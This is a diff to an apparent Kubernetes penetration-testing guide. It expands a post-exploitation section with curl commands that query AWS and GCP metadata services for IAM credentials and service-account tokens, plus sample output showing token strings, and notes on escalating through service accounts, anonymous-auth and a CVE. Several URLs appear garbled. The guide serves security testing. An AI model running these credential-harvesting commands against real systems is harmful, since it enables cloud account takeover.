@@ -63,19 +63,57 @@ Connection received on 10.0.0.162 42035
 
 # Post exploitation
 
-* **Cloud metadata** - If cloud hosted, try to access the cloud metadata service. You might get access to the IAM credentials associated with the node, or even just a cloud IAM credential created specifically for that pod. In either case, this can be your path to escalate within the cluster, within the cloud environment, or both.
-
+## Cloud metadata
+If cloud hosted, try to access the cloud metadata service. You might get access to the IAM credentials associated with the node, or even just a cloud IAM credential created specifically for that pod. In either case, this can be your path to escalate within the cluster, within the cloud environment, or both.
+### AWS
 ```bash
-curl http://169.254.169.254/latest/user-data # aws
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME] #aws
-curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/[account]/default/token #gcp
+curl http://169.254.169.254/latest/user-data #Look for credentials or bucket names
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ #List's role name
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME] # Get creds
+```
+### GCP
+Test to see if you have access to the metadata service:
+```
+curl -H "Metadata-Flavor: Google" 'http://metadata/computeMetadata/v1/instance/service-acc://www.example.com'
+126817330210-compute@developer.gserviceaccount.com/
+default/
 ```
 
-* **Overly permissive service account** - If the default service account is mounted to your pod and is overly permissive, you can use that token to further escalate your privs within the cluster.
+If you do, you can proceed with the next few commands, but I suggest deploying another pod with the gcloud image.  Using this image on an pod that has access to the metadata service allows gives you gcloud access assuming the role assigned to the node. 
 
-* **Anonymous-auth** - If either [the apiserver or the kubelets have anonymous-auth set to true](https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/), and there are no network policy controls preventing it, you can interact with them directly without authentication. 
-* **Exploits** - Is the kubernetes version vulnerable to an exploit, i.e. [CVE-2020-8558](https://github.com/tabbysable/POC-2020-8558)
-* **Traditional vulnerability hunting** -Your pod will be able to see a different view of the network services running within the cluster than you likely can see from the machine you used to create the pod. You can hunt for vulnerable services by proxying your traffic through the pod. 
+```
+curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/
+https://www.googleapis.com/auth/devstorage.read_only
+https://www.googleapis.com/auth/logging.write
+https://www.googleapis.com/auth/monitoring
+https://www.googleapis.com/auth/servicecontrol
+https://www.googleapis.com/auth/service.management.readonly
+https://www.googleapis.com/auth/trace.append
+
+curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id -s
+ultra-physics-269916
+
+curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/servimail -s
+126817330210-compute@developer.gserviceaccount.com
+
+ curl -H "Metadata-Flavor: Google" 'http://metadata/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://www.example.com'
+eyJhbGciOiJSUzI1NiIsImtpZCI6IjZhZGMxMDFjYzc0OThjMDljMDEwZGMzZDUxNzZmYTk3Yzk2MjdlY2IiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJod[REDACTED]
+
+
+curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/coance/service-accounts/default/token"      
+{"access_token":"ya29.c.KpcB6AdLfSYjR7UFotbqZNjLEPTkCGxCJOr7SWjMmyDAwe7InN8QGfeJnQZlpDytvKLgWUDl_0AxEtVciZ-IKlkfgio4jag9_z9Jv83K4yiNnIGGqAdoZL7EVWhWlSlkfgDRazvXir3aPZKtqLKxXlf5p9XKdhWbDBiSZovv_oo81LAAhXVzYfcWQ","expires_in":2792,"token_type":"Bearer"}
+```
+
+## Overly permissive service account
+If the default service account is mounted to your pod and is overly permissive, you can use that token to further escalate your privs within the cluster.
+
+## Anonymous-auth
+If either [the apiserver or the kubelets have anonymous-auth set to true](https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/), and there are no network policy controls preventing it, you can interact with them directly without authentication. 
+
+## Exploits
+Is the kubernetes version vulnerable to an exploit, i.e. [CVE-2020-8558](https://github.com/tabbysable/POC-2020-8558)
+## Traditional vulnerability hunting
+Your pod will be able to see a different view of the network services running within the cluster than you likely can see from the machine you used to create the pod. You can hunt for vulnerable services by proxying your traffic through the pod. 
 
    [This write-up of a CTF challenge](https://keramas.github.io/2020/08/10/Recon-Village-CTF-at-DC28.html) created by Madhu Akula demonstrates a pretty common post exploitation pattern
 
